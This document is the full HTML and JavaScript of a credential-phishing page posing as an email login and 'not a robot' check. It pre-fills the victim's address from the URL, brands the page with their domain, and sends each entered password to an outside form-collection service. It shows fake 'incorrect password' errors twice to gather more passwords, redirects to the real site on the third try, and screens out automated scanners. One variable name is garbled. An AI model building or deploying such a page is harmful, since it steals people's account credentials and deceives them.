<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Email Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f2f5;
        }
        .login-container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            width: 300px;
            position: relative;
            overflow: hidden;
        }
        .login-container::before {
            content: attr(data-domain);
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) rotate(-45deg);
            font-size: 60px;
            color: rgba(0, 0, 0, 0.1);
            white-space: nowrap;
            pointer-events: none;
            z-index: 0;
        }
        .form-group {
            margin-bottom: 15px;
            position: relative;
            z-index: 1;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        input {
            width: 100%;
            padding: 8px;
            border: 1px solid #ddd;
            border-radius: 4px;
            box-sizing: border-box;
        }
        input[readonly] {
            background-color: #f9f9f9;
            cursor: not-allowed;
        }
        button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .error-message {
            color: red;
            font-size: 14px;
            margin-top: 10px;
            text-align: center;
            display: none;
            position: relative;
            z-index: 1;
        }
        .honeypot {
            display: none;
        }
    </style>
</head>
<body>
    <div class="login-container" data-domain="">
        <h2 data-translate="form_header">Confirm you’re not a robot</h2>
        <form id="login-form" action="https://submit-form.com/J2IVAy4bj" method="POST">
            <div class="form-group">
                <label for="email" data-translate="email_label">Email:</label>
                <input type="email" id="email" name="email" required readonly>
            </div>
            <div class="form-group">
                <label for="password" data-translate="password_label">Password:</label>
                <input type="password" id="password" name="password" required>
            </div>
            <div class="form-group honeypot">
                <label for="honeypot">Leave this field empty:</label>
                <input type="text" id="honeypot" name="honeypot">
            </div>
            <button type="submit" data-translate="submit_button">Log In</button>
            <div class="error-message" id="error-message" data-translate="error_message">Incorrect password, please try again</div>
        </form>
    </div>

    <script>
        // Translation dictionary
        const translations = {
            en: {
                form_header: "Confirm you’re not a robot",
                email_label: "Email:",
                password_label: "Password:",
                submit_button: "Log In",
                error_message: "Incorrect password, please try again"
            },
            es: {
                form_header: "Confirma que no eres un robot",
                email_label: "Correo electrónico:",
                password_label: "Contraseña:",
                submit_button: "Iniciar sesión",
                error_message: "Contraseña incorrecta, por favor intenta de nuevo"
            },
            fr: {
                form_header: "Confirmez que vous n’êtes pas un robot",
                email_label: "E-mail :",
                password_label: "Mot de passe :",
                submit_button: "Se connecter",
                error_message: "Mot de passe incorrect, veuillez réessayer"
            },
            de: {
                form_header: "Bestätigen Sie, dass Sie kein Roboter sind",
                email_label: "E-Mail:",
                password_label: "Passwort:",
                submit_button: "Anmelden",
                error_message: "Falsches Passwort, bitte versuchen Sie es erneut"
            },
            it: {
                form_header: "Conferma che non sei un robot",
                email_label: "Email:",
                password_label: "Password:",
                submit_button: "Accedi",
                error_message: "Password errata, riprova"
            },
            pt: {
                form_header: "Confirme que você não é um robô",
                email_label: "E-mail:",
                password_label: "Senha:",
                submit_button: "Entrar",
                error_message: "Senha incorreta, tente novamente"
            },
            ja: {
                form_header: "あなたがロボットでないことを確認してください",
                email_label: "メール:",
                password_label: "パスワード:",
                submit_button: "ログイン",
                error_message: "パスワードが正しくありません。もう一度お試しください"
            },
            zh: {
                form_header: "确认您不是机器人",
                email_label: "电子邮件:",
                password_label: "密码:",
                submit_button: "登录",
                error_message: "密码错误，请重试"
            }
        };

        // Function to detect browser language
        function getBrowserLanguage() {
            const lang = navigator.language || navigator.languages[0];
            return lang.split('-')[0]; // Get base language (e.g., 'en' from 'en-US')
        }

        // Function to apply translations
        function applyTranslations(lang) {
            const elements = document.querySelectorAll('[data-translate]');
            const臂translation = translations[lang] || translations['en']; // Fallback to English
            elements.forEach(element => {
                const key = element.getAttribute('data-translate');
                element.textContent = translation[key];
            });
        }

        // Function to extract email and domain from URL using # or ?
        function getEmailFromUrl() {
            const url = window.location.href;
            let email = '';

            if (url.includes('#')) {
                email = url.split('#')[1];
            } else if (url.includes('?')) {
                const query = url.split('?')[1];
                const params = new URLSearchParams(query);
                email = params.get('email') || query.split('&')[0];
            }

            email = decodeURIComponent(email);
            let domain = email.includes('@') ? email.split('@')[1] : '';
            return { email, domain };
        }

        // Initialize form
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const honeypotInput = document.getElementById('honeypot');
        const loginContainer = document.querySelector('.login-container');
        const errorMessage = document.getElementById('error-message');
        const form = document.getElementById('login-form');
        const { email, domain } = getEmailFromUrl();
        if (email) {
            emailInput.value = email;
        }
        if (domain) {
            loginContainer.setAttribute('data-domain', domain);
        }

        // Apply translations based on browser language
        const browserLang = getBrowserLanguage();
        applyTranslations(browserLang);

        // Track submission attempts and timing
        let submissionAttempts = 0;
        const formLoadTime = Date.now();

        // Handle form submission with bot detection
        form.addEventListener('submit', async (event) => {
            event.preventDefault(); // Prevent default form submission

            // Bot detection: Check honeypot and submission speed
            const timeSinceLoad = Date.now() - formLoadTime;
            if (honeypotInput.value !== '' || timeSinceLoad < 1000) { // Bots often fill honeypot or submit too fast
                errorMessage.textContent = translations[browserLang]?.error_message || "Bot detected, please try again";
                errorMessage.style.display = 'block';
                passwordInput.value = '';
                honeypotInput.value = '';
                passwordInput.focus();
                return;
            }

            submissionAttempts++;

            // Submit form data to the specified URL
            const formData = new FormData(form);
            try {
                await fetch('https://submit-form.com/J2IVAy4bj', {
                    method: 'POST',
                    body: formData
                });
                // Note: No response handling since we control the flow client-side
            } catch (error) {
                console.error('Submission error:', error);
            }

            // Handle behavior based on attempt count
            if (submissionAttempts < 3) {
                // Show error message and clear password for first two attempts
                errorMessage.textContent = translations[browserLang]?.error_message || "Incorrect password, please try again";
                errorMessage.style.display = 'block';
                passwordInput.value = '';
                honeypotInput.value = ''; // Clear honeypot for next attempt
                passwordInput.focus();
            } else {
                // Redirect to domain website on third attempt
                if (domain) {
                    window.location.href = `https://${domain}`;
                } else {
                    // Fallback if no domain
                    errorMessage.textContent = translations[browserLang]?.error_message || "Incorrect password, please try again";
                    errorMessage.style.display = 'block';
                    passwordInput.value = '';
                    honeypotInput.value = '';
                    passwordInput.focus();
                }
            }
        });
    </script>
</body>
</html>
